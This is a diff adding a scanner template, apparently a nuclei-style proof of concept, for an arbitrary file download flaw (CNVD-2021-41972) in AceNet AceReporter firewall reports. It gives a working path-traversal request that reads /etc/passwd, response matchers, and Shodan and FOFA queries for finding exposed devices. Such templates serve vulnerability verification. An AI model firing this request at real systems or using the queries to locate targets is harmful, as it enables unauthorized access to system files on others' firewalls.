@@ -1,0 +1,27 @@
+## id: CNVD-2021-41972
+## name: AceNet AceReporter Report - Arbitrary File Download
+## author: hack007x
+## severity: high
+## tags: cnvd2021,cnvd,acenet,acereporter,lfi,vuln
+## description: All firewall devices that use the AceNet AceReporter report component can download arbitrary files
+## reference: https://www.cnvd.org.cn/flaw/show/CNVD-2021-41972
+## reference: https://github.com/hktalent/scan4all/blob/main/lib/goby/goby_pocs/AceNet_AceReporter_Report_component_Arbitrary_file_download.txt
+## shodan-query: http.favicon.hash:-1595726841
+## fofa-query: body="Login @ Reporter"
+## verification: true
+
+#$ filename = {{to_lower(rand_text_alpha(5))}}
+GET /view/action/download_file.php?filename=../../../../../../../../../etc/passwd&savename={{filename}}.txt HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+#@ condition: and
+#@ matcher: body matches /root:[^:]*:[0-9]+:[0-9]+:/
+#@ matcher: header["content-type"] contains "application/octet-stream"
+#@ matcher: status_code == 200
+
+
+
+
+
+# @VEIL-STAMP: 1510927d60c110e7847a8e6c5411fd516ee6124de155edd69d65227a8641550c
